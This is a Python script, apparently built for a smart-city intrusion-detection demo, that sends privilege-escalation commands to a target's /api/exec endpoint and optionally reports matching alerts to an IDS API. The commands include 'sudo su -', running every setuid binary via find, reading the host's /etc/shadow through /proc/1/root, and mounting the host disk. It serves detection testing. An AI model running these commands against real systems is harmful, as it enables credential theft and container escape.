#!/usr/bin/env python3
"""
Privilege Escalation Attack Simulator for Smart City IDS Demo
=============================================================
Simulates various privilege escalation techniques against smart city services.

Usage:
    python privilege_escalation.py <target_url> [--report-ids <ids_url>]
"""
import argparse
import json
import random
import time
from datetime import datetime, timezone

import requests

ESCALATION_TECHNIQUES = [
    {
        "name": "Sudo Abuse",
        "description": "Attempting sudo without password in container",
        "command": "sudo su -",
        "container": "power-grid-monitor",
        "user": "www-data",
    },
    {
        "name": "SUID Binary Exploitation",
        "description": "Exploiting setuid binary to gain root",
        "command": "find / -perm -4000 -exec {} \\;",
        "container": "traffic-camera-001",
        "user": "sensor",
    },
    {
        "name": "Container Escape via /proc",
        "description": "Attempting to access host filesystem via /proc",
        "command": "cat /proc/1/root/etc/shadow",
        "container": "air-quality-sensor",
        "user": "root",
    },
    {
        "name": "Capability Abuse (CAP_SYS_ADMIN)",
        "description": "Using CAP_SYS_ADMIN to mount host filesystem",
        "command": "mount /dev/sda1 /mnt",
        "container": "water-system-monitor",
        "user": "www-data",
    },
]


def simulate_escalation(target_url: str, ids_url: str = None, count: int = 4, delay: float = 2.0):
    """Run privilege escalation simulation."""
    print(f"\n{'='*60}")
    print(f"  Privilege Escalation Simulator")
    print(f"  Target: {target_url}")
    print(f"  Techniques: {count}")
    print(f"{'='*60}\n")

    session = requests.Session()

    for i in range(count):
        tech = random.choice(ESCALATION_TECHNIQUES)
        print(f"  [{i+1}/{count}] {tech['name']}")
        print(f"    Command: {tech['command']}")
        print(f"    Container: {tech['container']}")

        # Try exploiting the target service
        try:
            resp = session.get(
                f"{target_url}/api/exec",
                params={"cmd": tech["command"]},
                timeout=5,
            )
            print(f"    HTTP {resp.status_code}: {resp.text[:80]}")
        except Exception as e:
            print(f"    Connection: {str(e)[:60]}")

        # Optionally report to IDS API
        if ids_url:
            alert = {
                "output": f"Container privilege escalation: {tech['command']} in {tech['container']} (user={tech['user']})",
                "priority": "Critical",
                "rule": "Launch Privileged Container",
                "time": datetime.now(timezone.utc).isoformat(),
                "output_fields": {
                    "container.name": tech["container"],
                    "proc.cmdline": tech["command"],
                    "user.name": tech["user"],
                    "evt.type": "execve",
                },
            }
            try:
                r = requests.post(f"{ids_url}/api/alerts/internal", json=alert, timeout=10)
                data = r.json()
                sev = (data.get("analysis") or {}).get("severity", "?")
                print(f"    IDS Alert: severity={sev}, status={data.get('status')}")
            except Exception as e:
                print(f"    IDS Alert: failed ({e})")

        if i < count - 1:
            time.sleep(delay)

    print(f"\n  Done. {count} escalation attempts simulated.\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Privilege Escalation Simulator")
    parser.add_argument("target", help="Target service URL (e.g., http://localhost:30080)")
    parser.add_argument("--report-ids", default=None, help="IDS API URL to report alerts to")
    parser.add_argument("--count", type=int, default=4, help="Number of techniques to try")
    parser.add_argument("--delay", type=float, default=2.0, help="Delay between techniques")
    args = parser.parse_args()
    simulate_escalation(args.target, args.report_ids, args.count, args.delay)
